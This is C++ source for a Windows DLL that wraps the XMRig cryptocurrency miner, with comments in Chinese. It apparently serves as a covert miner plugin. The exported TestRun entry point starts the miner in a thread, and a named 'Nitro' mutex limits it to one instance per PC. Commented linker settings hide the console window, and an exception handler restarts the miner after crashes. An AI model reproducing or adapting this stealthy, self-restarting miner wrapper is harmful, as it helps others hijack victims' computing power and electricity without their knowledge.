/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2016-2017 XMRig       <support@xmrig.com>
 *
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"


//#pragma comment(lib, "libsysaux.lib")
//#pragma comment( linker, "/SUBSYSTEM:\"WINDOWS\" /entry:\"mainCRTStartup\"" )  //这里修改函数的入口点

//#pragma comment( linker, "/SUBSYSTEM:WINDOWS" )  //这个宏有点小问题

//这里把子系统设为windows 这样就没有控制台了

// dllmain.cpp : 定义 DLL 应用程序的入口点。

/************************************************************************/

DWORD WINAPI MyMain(LPVOID lpParam);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo);

HMODULE g_hDllModule; //定义Dll本身的句柄，方便自身函数回调

					  
/************************************************************************/


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		printf("\nprocess attach of dll\n");

		//保存Dll 自身的句柄
		g_hDllModule = (HMODULE)hModule;

	case DLL_THREAD_ATTACH:
		printf("\nthread attach of dll\n");

	case DLL_THREAD_DETACH:
		printf("\nthread detach of dll\n");

	case DLL_PROCESS_DETACH:
		printf("\nprocess detach of dll\n");

		break;
	}
	return TRUE;
}


extern "C" __declspec(dllexport) void TestRun(char* strHost, int nPort)
{

	DWORD threadID;
		
	HANDLE hThread = CreateThread(NULL, // default security attributes
		0, // use default stack size
		MyMain, // thread function
		NULL, // argument to thread function
		0, // use default creation flags	
		&threadID); // returns the thread identifier




													//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}


DWORD WINAPI MyMain(LPVOID lpParam)
{

	HANDLE	hInstallMutex = NULL;
	HANDLE	hEvent = NULL;

	// Set Window Station
	//--这里是同窗口交互
	HWINSTA hOldStation = GetProcessWindowStation();    //功能获取一个句柄,调用进程的当前窗口
	HWINSTA hWinSta = OpenWindowStation(L"winsta0", FALSE, MAXIMUM_ALLOWED);   //　打开指定的窗口站  XP的默认窗口站
	if (hWinSta != NULL)
	{
		SetProcessWindowStation(hWinSta);   //设置本进程窗口为winsta0  // 分配一个窗口站给调用进程，以便该进程能够访问窗口站里的对象，如桌面、剪贴板和全局原子
	}



	if (g_hDllModule != NULL)   //g_hInstance 该值要在Dll的入口进行赋值
	{
		//自己设置了一个访问违规的错误处理函数 如果发生了错误 操作系统就会调用bad_exception
		SetUnhandledExceptionFilter(bad_exception);  //这里就是错误处理的回调函数了


		hInstallMutex = CreateMutex(NULL, true, L"Nitro");  //该互斥体是只允许一台PC拥有一个实例

		App miner;
		return miner.exec();
	
	}
	return 0;
}




// 发生异常，重新创建进程
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{

	DWORD threadID;

	HANDLE hThread = CreateThread(NULL, // default security attributes
		0, // use default stack size
		MyMain, // thread function
		NULL, // argument to thread function
		0, // use default creation flags	
		&threadID); // returns the thread identifier




					//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}